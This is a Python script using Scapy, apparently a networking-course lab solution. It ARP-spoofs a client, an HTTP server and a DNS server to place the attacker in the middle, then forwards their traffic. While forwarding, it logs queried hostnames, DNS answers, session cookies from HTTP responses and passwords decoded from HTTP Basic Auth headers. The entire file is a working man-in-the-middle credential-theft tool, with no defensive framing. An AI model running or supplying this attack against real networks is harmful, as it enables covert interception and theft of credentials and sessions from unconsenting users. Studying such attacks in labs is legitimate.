from scapy.all import *
from scapy.layers import http
import base64

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Scapy built-in
    return getmacbyip(IP)


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    packet = Ether(src=srcMAC, dst=dstMAC, type=0x806)/ARP(op="is-at", psrc=srcIP, pdst=dstIP, hwsrc=srcMAC, hwdst=dstMAC)
    sendp(packet)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    packet = ARP(op="is-at", pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet)

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    try: 
        # Check if we want to intercept
        if(packet.haslayer(Ether) and packet[Ether].src == attackerMAC):
            # We sent this packet, ignore
            return 
        
        if(not packet.haslayer(IP) or not packet.haslayer(Ether)):
            return

        if(packet[IP].dst == clientIP):
            # This was meant for client but came to us, we modify before forwarding
            if(packet[IP].src == dnsServerIP and packet.haslayer(DNS) and packet.haslayer(DNSRR)):
                print("*hostaddr:"+ packet[DNS][DNSRR][0].rdata)
           
            if(packet[IP].src == httpServerIP and packet.haslayer(http.HTTPResponse)):
                print("*cookie:"+ packet[http.HTTPResponse].Set_Cookie.decode())
            packet[Ether].src = attackerMAC   
            packet[Ether].dst = clientMAC
            return sendp(packet)
        elif(packet[IP].src == clientIP):
            if(packet[IP].dst == httpServerIP):
                # Was meant for httpServer, modify before forwarding
                
                if(packet.haslayer(http.HTTPRequest)):
                    auth = packet[http.HTTPRequest].Authorization.decode()
                    auth = auth[auth.find(" ")+1:]
                    auth = base64.b64decode(auth).decode()
                    auth = auth[auth.find(":")+1:]
                    print("*basicauth:"+ auth)

                packet[Ether].dst = httpServerMAC
                packet[Ether].src = attackerMAC
                return sendp(packet)
            elif(packet[IP].dst == dnsServerIP):
                # Was meant for dnsServer, modify before forwarding
                if(packet.haslayer(DNS)):
                    print("*hostname:"+ packet[DNS][DNSQR][0].qname.decode())
                
                packet[Ether].dst = dnsServerMAC
                packet[Ether].src = attackerMAC
                return sendp(packet)
    except Exception as e:
        print("# Exception:", e)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity

    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
